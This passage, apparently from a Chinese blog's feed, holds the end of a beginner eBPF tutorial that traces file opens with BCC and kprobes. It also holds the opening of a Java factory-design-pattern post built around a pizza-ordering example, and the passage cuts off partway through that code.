class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># 1) import bcc library</span><span class="token keyword">from</span> bcc <span class="token keyword">import</span> BPF<span class="token comment"># 2) load BPF program</span>b <span class="token operator">=</span> BPF<span class="token punctuation">(</span>src_file<span class="token operator">=</span><span class="token string">"hello.c"</span><span class="token punctuation">)</span><span class="token comment"># 3) attach kprobe</span>b<span class="token punctuation">.</span>attach_kprobe<span class="token punctuation">(</span>event<span class="token operator">=</span><span class="token string">"do_sys_openat2"</span><span class="token punctuation">,</span> fn_name<span class="token operator">=</span><span class="token string">"hello_world"</span><span class="token punctuation">)</span><span class="token comment"># 4) read and print /sys/kernel/debug/tracing/trace_pipe</span>b<span class="token punctuation">.</span>trace_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>让我们来看看每一处的具体含义：</p><p>第 1) 处导入了 BCC  库的 BPF 模块，以便接下来调用；</p><p>第 2) 处调用 BPF() 加载第一步开发的 BPF 源代码；</p><p>第 3) 处将 BPF 程序挂载到内核探针（简称 kprobe），其中  do_sys_openat2() 是系统调用  openat()  在内核中的实现；</p><p>第 4) 处则是读取内核调试文件 <code>/sys/kernel/debug/tracing/trace_pipe</code> 的内容，并打印到标准输出中。</p><h3 id="第三步：执行-eBPF-程序"><a href="#第三步：执行-eBPF-程序" class="headerlink" title="第三步：执行 eBPF 程序"></a>第三步：执行 eBPF 程序</h3><p>需要以 root 用户权限执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python3 hello.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出如图</p><img src="/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/successSout.png" class=""><p>这就是一个简单的 eBPF 程序了，但是我们可以看到这个 eBPF 程序当中有几个缺点</p><ol><li>既然我们是通过 ebpf 监控系统打开文件的操作，那么正常情况输出结果应该有打开的文件名</li><li>现在读取结果是直接读 <code>/sys/kernel/debug/tracing/trace_pipe</code> 这个内核调试文件的，这就有一个问题，当存在多个 ebpf 程序的时候输出结果都是到这个文件，这样的话就使得输出结果很不清晰，并且这样性能也很差</li></ol><p>针对上述两个问题，需要利用 BPF 映射来结果，通过映射来读取 ebpf 执行的结果并适当进行一些数据处理，因为上述截图中很多输出字段都是我们不需要的</p><h2 id="改进第一个-eBPF-程序"><a href="#改进第一个-eBPF-程序" class="headerlink" title="改进第一个 eBPF 程序"></a>改进第一个 eBPF 程序</h2><p>BPF 程序可以利用 BPF 映射（map）进行数据存储，而用户程序也需要通过 BPF 映射，同运行在内核中的 BPF 程序进行交互。</p><p>所以，为了解决上面提到的第一个问题，即获取被打开文件名的问题，我们就要引入 BPF 映射。</p><p>BCC 定义了一系列的库函数和辅助宏定义。这里使用 <code>BPF_PERF_OUTPUT</code> 来定义一个 Perf 事件类型的 BPF 映射，这里先定义一个数据结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 包含头文件</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;uapi/linux/openat2.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/sched.h></span></span><span class="token comment">// 定义数据结构</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span> <span class="token punctuation">&#123;</span>  u32 pid<span class="token punctuation">;</span> <span class="token comment">// 进程pid</span>  u64 ts<span class="token punctuation">;</span>  <span class="token comment">// 时间</span>  <span class="token keyword">char</span> comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 进程名</span>  <span class="token keyword">char</span> fname<span class="token punctuation">[</span>NAME_MAX<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 文件名</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义性能事件映射</span><span class="token function">BPF_PERF_OUTPUT</span><span class="token punctuation">(</span>events<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后，在 eBPF 程序中，填充这个数据结构，并调用  <code>perf_submit()</code>  把数据提交到刚才定义的 BPF 映射中：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 定义kprobe处理函数</span><span class="token keyword">int</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pt_regs</span> <span class="token operator">*</span>ctx<span class="token punctuation">,</span> <span class="token keyword">int</span> dfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span> filename<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">open_how</span> <span class="token operator">*</span>how<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">data_t</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// 获取PID和时间</span>  data<span class="token punctuation">.</span>pid <span class="token operator">=</span> <span class="token function">bpf_get_current_pid_tgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>ts <span class="token operator">=</span> <span class="token function">bpf_ktime_get_ns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 获取进程名</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bpf_get_current_comm</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">bpf_probe_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">.</span>fname<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>fname<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// 提交性能事件</span>  events<span class="token punctuation">.</span><span class="token function">perf_submit</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>合起来就是下面这个文件，该文件最终在内核中进行运行，将采集到的数据输出到映射中</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 包含头文件</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;uapi/linux/openat2.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/sched.h></span></span><span class="token comment">// 定义数据结构</span><span class="token keyword">struct</span> <span class="token class-name">data_t</span> <span class="token punctuation">&#123;</span>  u32 pid<span class="token punctuation">;</span> <span class="token comment">// 进程pid</span>  u64 ts<span class="token punctuation">;</span>  <span class="token comment">// 时间</span>  <span class="token keyword">char</span> comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 进程名</span>  <span class="token keyword">char</span> fname<span class="token punctuation">[</span>NAME_MAX<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 文件名</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义性能事件映射</span><span class="token function">BPF_PERF_OUTPUT</span><span class="token punctuation">(</span>events<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 定义kprobe处理函数</span><span class="token keyword">int</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pt_regs</span> <span class="token operator">*</span>ctx<span class="token punctuation">,</span> <span class="token keyword">int</span> dfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span> filename<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">open_how</span> <span class="token operator">*</span>how<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">data_t</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// 获取PID和时间</span>  data<span class="token punctuation">.</span>pid <span class="token operator">=</span> <span class="token function">bpf_get_current_pid_tgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>ts <span class="token operator">=</span> <span class="token function">bpf_ktime_get_ns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 获取进程名</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bpf_get_current_comm</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>comm<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// 获取进程名并且存储到缓冲区中</span>  <span class="token punctuation">&#123;</span>     <span class="token function">bpf_probe_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">.</span>fname<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>fname<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 读取进程打开的文件名</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// 提交性能事件</span>  events<span class="token punctuation">.</span><span class="token function">perf_submit</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们需要编写一个用户态的调用程序</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bcc <span class="token keyword">import</span> BPF<span class="token comment"># 加载bpf代码</span>b <span class="token operator">=</span> BPF<span class="token punctuation">(</span>src_file<span class="token operator">=</span><span class="token string">"trace-open.c"</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span>attach_kprobe<span class="token punctuation">(</span>event<span class="token operator">=</span><span class="token string">"do_sys_openat2"</span><span class="token punctuation">,</span> fn_name<span class="token operator">=</span><span class="token string">"hello_world"</span><span class="token punctuation">)</span><span class="token comment"># 格式化输出</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%-18s %-16s %-6s %-16s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">"TIME(s)"</span><span class="token punctuation">,</span> <span class="token string">"COMM"</span><span class="token punctuation">,</span> <span class="token string">"PID"</span><span class="token punctuation">,</span> <span class="token string">"FILE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 这里是一个回调函数来进行数据处理 </span>start <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">print_event</span><span class="token punctuation">(</span>cpu<span class="token punctuation">,</span> data<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> start    event <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token string">"events"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>event<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> start <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            start <span class="token operator">=</span> event<span class="token punctuation">.</span>ts    time_s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>ts <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000000000</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%-18.9f %-16s %-6d %-16s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time_s<span class="token punctuation">,</span> event<span class="token punctuation">.</span>comm<span class="token punctuation">,</span> event<span class="token punctuation">.</span>pid<span class="token punctuation">,</span> event<span class="token punctuation">.</span>fname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 定义名为 “events” 的 Perf 事件映射，然后循环调用读取</span>b<span class="token punctuation">[</span><span class="token string">"events"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>open_perf_buffer<span class="token punctuation">(</span>print_event<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        b<span class="token punctuation">.</span>perf_buffer_poll<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/ModifyResult.png" class=""><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>简单接触一下 eBPF 的使用</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p>极客时间 eBPF 核心技术与实战</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;eBPF 的基本使用，eBPF 学习（一）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>Java 设计模式之工厂模式</title>
    <link href="https://drun1baby.github.io/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
    <id>https://drun1baby.github.io/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</id>
    <published>2023-07-04T02:09:36.000Z</published>
    <updated>2023-07-04T02:10:44.077Z</updated>
    
    <content type="html"><![CDATA[<p>Java 设计模式之工厂模式</p><span id="more"></span><h1 id="Java-设计模式之工厂模式"><a href="#Java-设计模式之工厂模式" class="headerlink" title="Java 设计模式之工厂模式"></a>Java 设计模式之工厂模式</h1><h2 id="0x01-需求分析"><a href="#0x01-需求分析" class="headerlink" title="0x01 需求分析"></a>0x01 需求分析</h2><h3 id="看一个具体的需求"><a href="#看一个具体的需求" class="headerlink" title="看一个具体的需求"></a>看一个具体的需求</h3><p>看一个披萨的项目：要便于披萨种类的扩展，要便于维护。</p><ul><li>披萨的种类很多（比如 GreekPizza、CheesePizza 等）；</li><li>披萨的制作有 prepare，bake，cut，box；</li><li>完成披萨店订购功能。</li></ul><h3 id="使用传统的方式完成"><a href="#使用传统的方式完成" class="headerlink" title="使用传统的方式完成"></a>使用传统的方式完成</h3><img src="/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/TraditionalSolves.png" class=""><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//把Pizza类做成抽象类</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Pizza</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token comment">//名字</span>    <span class="token comment">//准备原材料，不同的披萨不一样，因此，我们做成抽象方法</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">bake</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" baking"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" cutting"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">box</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" boxing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GreekPizza</span> <span class="token keyword">extends</span> <span class="token class-name">Pizza</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"给GreekPizza准备原材料"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CheessPizza</span> <span class="token keyword">extends</span> <span class="token class-name">Pizza</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"给CheessPizza准备原材料"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderPizza</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">OrderPizza</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Pizza</span> pizza <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> orderType<span class="token punctuation">;</span><span class="token comment">//订购披萨的类型</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            orderType <span class="token operator">=</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>orderType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"greek"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                pizza <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GreekPizza</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                pizza<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"GreekPizza"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>orderType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"cheess"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                pizza <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CheessPizza</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                pizza<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"CheessPizza"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//输出pizza制作过程</span>            pizza<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pizza<span class="token punctuation">.</span><span class="token function">bake</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pizza<span class="token punctuation">.</span><span class="token function">cut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pizza<span class="token punctuation">.</span><span class="token function">box</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//写一个方法，可以获取客户希望订购的披萨种类</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">BufferedReader</span> strin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"input pizza type:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            str <span class="token operator">=</span> strin<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> str<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//相当于客户端</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderStore</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">OrderPizza</span> orderPizza <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OrderPizza</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>传统方式的优缺点</strong>：</p><ul><li>优点是比较好理解，简单易操作；</li><li>缺点是违反了设计模式的 OCP 原则，即对扩展开放，对修改关闭。即当我们给类增加新功能的时候，尽量不修改代码，或者尽量少修改代码；</li><li>比如这时我们要新增加一个 Pizza 的种类（Pepper 披萨），我们需要做的修改较大。</li></ul><p><strong>改进的思路分析</strong>：</p><ul><li>分析：修改代码可以接受，但是如果我们在其它的地方也有创建 Pizza 的代码，就意味着，也需要修改，而创建 Pizza 的代码，往往有多处；</li><li>思路：把创建 Pizza 对象封装到一个类中，这样我们有新的 Pizza 种类时，只需要修改该类就可，其它有创建到 Pizza 对象的代码就不需要修改了（使用简单工厂模式）。</li></ul><h2 id="0x02-简单工厂模式"><a href="#0x02-简单工厂模式" class="headerlink" title="0x02 简单工厂模式"></a>0x02 简单工厂模式</h2><p>简单工厂模式是属于创建型模式，是工厂模式的一种。简单工厂模式是由一个工厂对象决定创建出哪一种产品类的实例。简单工厂模式是工厂模式家族中最简单实用的模式。</p><p>简单工厂模式：定义了一个创建对象的类，由这个类来封装实例化对象的行为。<br>在软件开发中，当我们会用到大量的创建某种、某类或者谋批对象时，就会使用到工厂模式。</p><p>简单工厂模式的设计方案：定义一个可以实例化 Pizza 对象的类，封装创建对象的代码。</p><img src="/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/easyFactory.png" class=""><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//简单工厂类</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SimpleFactory</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//简单工厂模式，也叫静态工厂模式，可以用static修饰该方法</span>    <span class="token keyword">public</span> <span class="token class-name">Pizza</span> <span class="token function">createPizza</span><span class="token punctuation">(</span><span class="token class-name">String</span> orderType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Pizza</span> pizza <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>orderType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"greek"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 